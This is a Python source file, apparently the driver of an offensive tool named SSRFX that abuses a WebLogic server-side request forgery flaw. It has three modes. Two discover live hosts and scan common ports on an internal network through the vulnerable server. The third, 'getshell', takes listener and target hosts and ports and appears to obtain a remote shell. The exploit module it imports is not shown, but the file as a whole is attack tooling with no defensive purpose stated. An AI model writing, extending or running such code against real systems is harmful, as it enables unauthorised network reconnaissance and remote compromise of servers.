# /usr/bin/env python
# coding=utf-8


import threading
from Queue import Queue
from libs.log import logInit
from libs.cmdline import get_args
from attacklibs.weblogic import WeblogicExp
from libs.port2service import Common_Port2Service

mutex = threading.Lock()

class SSRFX:
    def __init__(self):
        self.args = get_args()
        self.liveip = []        # [ip]
        self.portresutl = []    #[(ip,port,service)]
        self.logger = logInit(log_dir="./logs", log_name=self.args.host + ".log")
        self.report_file = self.args.host + self.args.type + ".txt"
        if self.args.app == "weblogic":
            self.ssrfExp = WeblogicExp(self.args.url)
        else:
            pass
        if self.args.network:   # 扫描状态
            qsize = (len(self.args.network) / 1024 + 1) * 1024
            self.queue = Queue(qsize)
            self.thread_list = list()
            self.setTask()

    def setTask(self):
        """
        设置任务队列
        :return:
        """
        for host in self.args.network:
            self.queue.put(host)
        for i in range(self.args.threads):
            self.thread_list.append(threading.Thread(target=self.run))
        for t in self.thread_list:
            t.start()
        for t in self.thread_list:
            t.join()

    def run(self):
        """
        开始攻击
        :return:
        """
        if self.args.type == "livedetect":
            while True:
                if not self.queue.empty():
                    ip = self.queue.get()
                    status = self.ssrfExp.liveDetect(ip)
                    mutex.acquire()
                    if status == -1:
                        self.logger.warning(ip + "\t:down")
                    elif status == 1:
                        self.logger.info(ip + "\t:up")
                        self.liveip.append(ip)
                    elif status == 0:
                        self.logger.error("Network went wrong!")
                    else:
                        self.logger.error("Something went wrong")
                    mutex.release()
                else:
                    break
        elif self.args.type == "portscan":
            while True:
                if not self.queue.empty():
                    ip = self.queue.get()
                    for port in Common_Port2Service.keys():
                        status = self.ssrfExp.portScan(ip, port)
                        mutex.acquire()
                        if status == -1:
                            self.logger.warning(ip + ":" + port + "\t:closed")
                        elif status == 1:
                            self.logger.info(ip + ":" + port + "\t:open")
                            self.portresutl.append((ip, port, Common_Port2Service[port]))
                        elif status == 0:
                            self.logger.error("Network went wrong!")
                        else:
                            self.logger.error("Something went wrong")
                        mutex.release()
                else:
                    break
        elif self.args.type == "getshell":
            self.ssrfExp.getShell(self.args.lhost, self.args.lport, self.args.rhost, self.args.rport, self.args.vulapp)
        else:
            pass

if __name__ == "__main__":
    ssrf = SSRFX()
    ssrf.run()
